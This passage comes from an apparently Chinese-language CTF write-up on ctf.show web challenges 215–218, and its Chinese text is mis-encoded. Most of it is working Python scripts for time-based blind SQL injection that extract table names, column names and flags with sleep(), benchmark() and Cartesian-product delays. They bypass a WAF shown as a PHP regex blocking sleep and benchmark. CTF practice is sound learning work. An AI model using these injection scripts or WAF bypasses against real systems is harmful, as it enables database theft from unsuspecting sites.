</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥åˆ—å</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># çˆ†å­—æ®µ</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># payload = &#34;select flaga from ctfshow_flagx&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1&#39; or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web216">web216<a hidden class="anchor" aria-hidden="true" href="#web216">#</a></h4>
<p><img alt="image-20250214122109700" loading="lazy" src="./assets/image-20250214122109700.png"></p>
<p>æ„é€ é—­åˆå³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># æŸ¥è¡¨å</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># æŸ¥åˆ—å</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxcc&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># çˆ†å­—æ®µ</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaac from ctfshow_flagxcc&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;&#39;&#39;) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web217">web217<a hidden class="anchor" aria-hidden="true" href="#web217">#</a></h4>
<p><img alt="image-20250214145642775" loading="lazy" src="./assets/image-20250214145642775.png"></p>
<p>è¿™é¢˜wafäº†sleep</p>
<p>å¯ä»¥æ”¹ç”¨benchmark</p>
<blockquote>
<ul>
<li>åœ¨ MySQL ä¸­ï¼Œ<code>benchmark</code>å‡½æ•°ç”¨äºæµ‹è¯•è¡¨è¾¾å¼æ‰§è¡Œçš„æ€§èƒ½ã€‚å®ƒçš„è¯­æ³•æ˜¯<code>benchmark(count,expr)</code>ï¼Œå…¶ä¸­<code>count</code>æ˜¯è¦æ‰§è¡Œ<code>expr</code>çš„æ¬¡æ•°ï¼Œ<code>expr</code>æ˜¯è¦æµ‹è¯•çš„è¡¨è¾¾å¼ã€‚</li>
<li>ä¾‹å¦‚ï¼Œ<code>benchmark(10000000,sha(1))</code>è¡¨ç¤ºå°†<code>sha(1)</code>è¿™ä¸ªè¡¨è¾¾å¼æ‰§è¡Œ 10000000 æ¬¡ã€‚<code>sha(1)</code>æ˜¯è®¡ç®—å­—ç¬¦ä¸²<code>'1'</code>çš„ SHA - 1 å“ˆå¸Œå€¼ã€‚</li>
</ul></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®åº“</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># æŸ¥åˆ—åå­—</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxccb&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># æŸ¥æ•°æ®</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaabc from ctfshow_flagxccb&#34;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,benchmark(1000000,sha(1)),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="c1"># å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.33</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚è¶…æ—¶ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å¤§äºä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;An unexpected error occurred: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">
</span></span><span class="line"><span class="ln">42</span><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="c1"># å¦‚æœæ‰¾åˆ°æœ‰æ•ˆçš„å­—ç¬¦ï¼Œå°†å…¶æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="c1"># å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ‰æ•ˆå­—ç¬¦ï¼Œé€€å‡ºå¾ªç¯</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">
</span></span><span class="line"><span class="ln">49</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*]Result : &#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><p>benchmarkçš„è®¾ç½®æ¯”è¾ƒè‹›åˆ»ï¼Œè¦å¤šè¯•è¯•</p>
<p>æœ€å¥½ä¸è¦è®¾ç½®å¤ªå¤§ï¼Œç¯å¢ƒä¼šå´©</p>
<h4 id="web218">web218<a hidden class="anchor" aria-hidden="true" href="#web218">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">       <span class="nx">where</span> <span class="nx">id</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="c1">//å±è”½å±é™©åˆ†å­
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"></span>    <span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/sleep|benchmark/i&#39;</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="p">}</span>   
</span></span><span class="line"><span class="ln">11</span><span class="cl">      
</span></span></code></pre></div><p>è¿™é¢˜sleepå’Œbenchmarkéƒ½è¢«banæ‰äº†</p>
<p>å¯ä»¥è€ƒè™‘ç”¨ç¬›å¡å°”ç§¯ç›²æ³¨</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://cloud.tencent.com/developer/article/1601686">SQLæ³¨å…¥ç»éªŒ-å¤§è´Ÿè·æ³¨å…¥-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1"># ASCIIç èŒƒå›´ï¼Œ32åˆ°127æ˜¯å¯æ‰“å°å­—ç¬¦çš„èŒƒå›´</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1"># äºŒåˆ†æŸ¥æ‰¾çš„ä¸­é—´å€¼</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = &#34;select table_name from information_schema.tables where table_schema=database() limit 0,1&#34;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select column_name from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39; limit 1,1&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flagaac from ctfshow_flagxc&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;1) or if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,(select count(*) from information_schema.columns A, information_schema.columns B),1)#&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="c1"># å‘é€POSTè¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ä¸º1ç§’</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.15</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚åœ¨1ç§’å†…è¿”å›ï¼Œè¯´æ˜å½“å‰ä½ç½®å­—ç¬¦çš„ASCIIç å°äºç­‰äºä¸­é—´å€¼</span>
